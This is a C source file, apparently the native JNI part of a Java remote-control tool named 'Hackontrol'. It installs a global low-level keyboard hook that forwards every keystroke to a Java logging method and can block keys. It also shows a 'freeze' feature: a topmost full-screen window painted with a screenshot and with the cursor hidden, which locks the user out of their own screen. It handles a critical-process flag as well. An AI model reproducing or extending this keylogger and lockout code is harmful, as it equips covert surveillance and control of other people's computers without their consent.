#include <Windows.h>
#include "exception.h"
#include "Kernel.h"
#include "instance.h"
#include "window.h"

#define CLASS_NAME L"ICoveringWindow"

static JNIEnv* globalEnvironment;
static jclass globalUserClass;
static HWND globalWindow;
static jmethodID globalLogMethod;
static HBITMAP globalBitmap;

static LRESULT CALLBACK windowProcedure(HWND window, UINT message, WPARAM wparam, LPARAM lparam) {
	switch(message) {
	case WM_CLOSE:
		DestroyWindow(window);
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	case WM_SETCURSOR:
		SetCursor(NULL);
		return 0;
	case WM_QUERYENDSESSION:
		if(lparam != 0 && !(lparam & ENDSESSION_CRITICAL)) {
			return TRUE;
		}

		Kernel_setProcessCritical(globalEnvironment, NULL, FALSE);
		return TRUE;
	case WM_PAINT:
		if(!globalBitmap) {
			break;
		}

		PAINTSTRUCT paintStruct;
		HDC context = BeginPaint(window, &paintStruct);
		HDC memoryContext = CreateCompatibleDC(context);
		HBITMAP oldBitmap = SelectObject(memoryContext, globalBitmap);
		BITMAP bitmap;
		GetObjectW(globalBitmap, sizeof(bitmap), &bitmap);
		BitBlt(context, 0, 0, bitmap.bmWidth, bitmap.bmHeight, memoryContext, 0, 0, SRCCOPY);
		SelectObject(memoryContext, oldBitmap);
		DeleteDC(memoryContext);
		EndPaint(window, &paintStruct);
		return 0;
	}

	return DefWindowProcW(window, message, wparam, lparam);
}

static LRESULT CALLBACK keyLoggerProcedure(_In_ int code, _In_ WPARAM wparam, _In_ LPARAM lparam) {
	if(code != HC_ACTION) {
		return CallNextHookEx(NULL, code, wparam, lparam);
	}

	PKBDLLHOOKSTRUCT keyboard = (PKBDLLHOOKSTRUCT) lparam;
	WCHAR buffer[256];
	int length = GetKeyNameTextW((keyboard->scanCode & 0xFF) << 16, buffer, 256);

	if(!length) {
		return CallNextHookEx(NULL, code, wparam, lparam);
	}

	return (*globalEnvironment)->CallStaticBooleanMethod(globalEnvironment, globalUserClass, globalLogMethod, (jint) wparam, (jint) keyboard->vkCode, (jint) keyboard->scanCode, (jint) keyboard->flags, (jint) keyboard->time, (*globalEnvironment)->NewString(globalEnvironment, buffer, length)) ? 1 : CallNextHookEx(NULL, code, wparam, lparam);
}

static DWORD WINAPI windowThread(_In_ LPVOID parameter) {
	JavaVM* virtualMachine = (JavaVM*) parameter;

	if(!virtualMachine) {
		return 1;
	}

	JavaVMAttachArgs arguments = {0};
	arguments.version = JNI_VERSION_21;
	JNIEnv* environment = NULL;

	if((*virtualMachine)->AttachCurrentThread(virtualMachine, (void**) &environment, &arguments) != JNI_OK) {
		return 1;
	}

	globalEnvironment = environment;
	jclass userClass = (*environment)->FindClass(environment, "com/khopan/hackontrol/library/User");
	DWORD returnValue = 1;

	if(!userClass) {
		goto detachThread;
	}

	globalUserClass = userClass;
	jmethodID logMethod = (*environment)->GetStaticMethodID(environment, userClass, "log", "(IIIIILjava/lang/String;)Z");
	
	if(!logMethod) {
		goto detachThread;
	}

	globalLogMethod = logMethod;
	HINSTANCE instance = GetProgramInstance();
	WNDCLASSW windowClass = {0};
	windowClass.style = CS_VREDRAW | CS_HREDRAW;
	windowClass.lpfnWndProc = windowProcedure;
	windowClass.hInstance = instance;
	windowClass.hCursor = NULL;
	windowClass.lpszClassName = CLASS_NAME;

	if(!RegisterClassW(&windowClass)) {
		HackontrolThrowWin32Error(environment, L"RegisterClassW");
		goto detachThread;
	}

	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);
	HWND window = CreateWindowExW(WS_EX_TOOLWINDOW | WS_EX_TOPMOST, CLASS_NAME, NULL, WS_POPUP, 0, 0, width, height, NULL, NULL, instance, NULL);

	if(!window) {
		HackontrolThrowWin32Error(environment, L"CreateWindowExW");
		goto unregisterWindowClass;
	}

	globalWindow = window;

	if(!SetWindowsHookExW(WH_KEYBOARD_LL, keyLoggerProcedure, NULL, 0)) {
		HackontrolThrowWin32Error(environment, L"SetWindowsHookExW");
		goto unregisterWindowClass;
	}

	MSG message;

	while(GetMessageW(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessageW(&message);
	}

	returnValue = 0;
unregisterWindowClass:
	if(!UnregisterClassW(CLASS_NAME, instance)) {
		HackontrolThrowWin32Error(environment, L"UnregisterClassW");
		returnValue = 1;
	}
detachThread:
	if((*virtualMachine)->DetachCurrentThread(virtualMachine) != JNI_OK) {
		SetLastError(ERROR_FUNCTION_FAILED);
		HackontrolThrowWin32Error(environment, L"JavaVM::DetachCurrentThread");
		return 1;
	}

	return returnValue;
}

static BOOL captureScreen(JNIEnv* const environment) {
	HDC screenContext = GetDC(NULL);

	if(!screenContext) {
		SetLastError(ERROR_FUNCTION_FAILED);
		HackontrolThrowWin32Error(environment, L"GetDC");
		return FALSE;
	}

	HDC memoryContext = CreateCompatibleDC(screenContext);
	BOOL returnValue = FALSE;

	if(!memoryContext) {
		SetLastError(ERROR_FUNCTION_FAILED);
		HackontrolThrowWin32Error(environment, L"CreateCompatibleDC");
		goto deleteScreenContext;
	}

	int width = GetDeviceCaps(screenContext, HORZRES);
	int height = GetDeviceCaps(screenContext, VERTRES);
	HBITMAP bitmap = CreateCompatibleBitmap(screenContext, width, height);

	if(!memoryContext) {
		SetLastError(ERROR_FUNCTION_FAILED);
		HackontrolThrowWin32Error(environment, L"CreateCompatibleBitmap");
		goto deleteMemoryContext;
	}

	HBITMAP oldBitmap = SelectObject(memoryContext, bitmap);

	if(!oldBitmap || oldBitmap == HGDI_ERROR) {
		SetLastError(ERROR_FUNCTION_FAILED);
		HackontrolThrowWin32Error(environment, L"SelectObject");
		goto deleteMemoryContext;
	}

	if(!BitBlt(memoryContext, 0, 0, width, height, screenContext, 0, 0, SRCCOPY)) {
		HackontrolThrowWin32Error(environment, L"BitBlt");
		goto deleteMemoryContext;
	}

	bitmap = SelectObject(memoryContext, oldBitmap);

	if(!bitmap || bitmap == HGDI_ERROR) {
		SetLastError(ERROR_FUNCTION_FAILED);
		HackontrolThrowWin32Error(environment, L"SelectObject");
		goto deleteMemoryContext;
	}

	globalBitmap = bitmap;
	returnValue = TRUE;
deleteMemoryContext:
	DeleteDC(memoryContext);
deleteScreenContext:
	DeleteDC(screenContext);
	return returnValue;
}

void HackontrolInitializeWindow(JNIEnv* const environment, JavaVM* const virtualMachine) {
	if(!CreateThread(NULL, 0, windowThread, virtualMachine, 0, NULL)) {
		HackontrolThrowWin32Error(environment, L"CreateThread");
	}
}

void Kernel_setFreeze(JNIEnv* const environment, const jclass class, const jboolean freeze) {
	if(freeze && !captureScreen(environment)) {
		return;
	}

	ShowWindow(globalWindow, freeze ? SW_SHOW : SW_HIDE);
}
